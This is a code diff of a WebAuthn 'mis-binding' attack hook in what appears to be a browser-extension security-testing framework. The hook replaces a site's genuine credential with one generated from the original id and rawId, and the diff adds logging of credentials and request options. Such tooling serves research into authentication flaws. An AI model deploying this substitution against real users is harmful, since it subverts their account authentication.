@@ -5,11 +5,15 @@ import { generateRegistrationKeyAndAttestation, DirectAttestationError, NoKeysRe
 import { WebAuthnRequestMessage, WebAuthnResponseMessage, WebAuthnErrorMessage } from '../types/types';
 
 export class AttackHookMisBinding extends AttackHook {
+    logHelper(...msg: any[]): void {
+        console.log('[AttackHookMisBinding] ', msg);
+    }
     getName(): string {
         return 'attack-mis-binding';
     }
 
     async onCredentialCreate(msg: WebAuthnRequestMessage, sender: chrome.runtime.MessageSender): Promise<WebAuthnResponseMessage | WebAuthnErrorMessage> {
+        this.logHelper('misbind onCredentialCreate called:', msg, sender);
         if (!sender.url) {
             return {
                 requestID: msg.requestID,
@@ -20,15 +24,19 @@ export class AttackHookMisBinding extends AttackHook {
         const origin = getOriginFromUrl(sender.url);
 
         const originalCredential = webauthnParse(msg.originalCredential);
+        this.logHelper('originalCredential', originalCredential);
 
         const id = originalCredential.id;
+        this.logHelper('id', id);
         const rawId = Array.from(new Uint8Array(originalCredential.rawId));
+        this.logHelper('rawId', rawId);
         try {
             if (!origin) {
                 throw new Error("BROKEN FUNCTIONALITY misbinding. No origin")
             }
             const opts = webauthnParse(msg.options);
-            console.log(msg);
+            this.logHelper('opts', opts);
+            this.logHelper(msg);
             const credential = await generateRegistrationKeyAndAttestation(
                 origin,
                 opts.publicKey,
@@ -37,10 +45,10 @@ export class AttackHookMisBinding extends AttackHook {
                 rawId,
             );
 
-            console.log('create credential');
-            console.log(credential);
-            console.log(webauthnStringify(credential));
-            console.log('RE PARSE ', webauthnParse(webauthnStringify(credential)));
+            this.logHelper('create credential');
+            this.logHelper(credential);
+            this.logHelper(webauthnStringify(credential));
+            this.logHelper('RE PARSE ', webauthnParse(webauthnStringify(credential)));
             return {
                 credential: webauthnStringify(credential),
                 requestID: msg.requestID,
@@ -49,9 +57,9 @@ export class AttackHookMisBinding extends AttackHook {
         } catch (e) {
             if (e instanceof DOMException) {
                 const { code, message, name } = e;
-                console.log('failed to import key due to DOMException', { code, message, name }, e);
+                this.logHelper('failed to import key due to DOMException', { code, message, name }, e);
             } else {
-                console.log('failed to import key', { errorType: `${(typeof e)}` }, e);
+                this.logHelper('failed to import key', { errorType: `${(typeof e)}` }, e);
             }
 
             return {
@@ -63,7 +71,7 @@ export class AttackHookMisBinding extends AttackHook {
     }
 
     async onCredentialGet(msg: WebAuthnRequestMessage, sender: chrome.runtime.MessageSender): Promise<WebAuthnResponseMessage | WebAuthnErrorMessage> {
-
+        this.logHelper('misbind onCredentialGet called:', msg, sender);
         return {
             type: 'sign_response',
             requestID: msg.requestID,
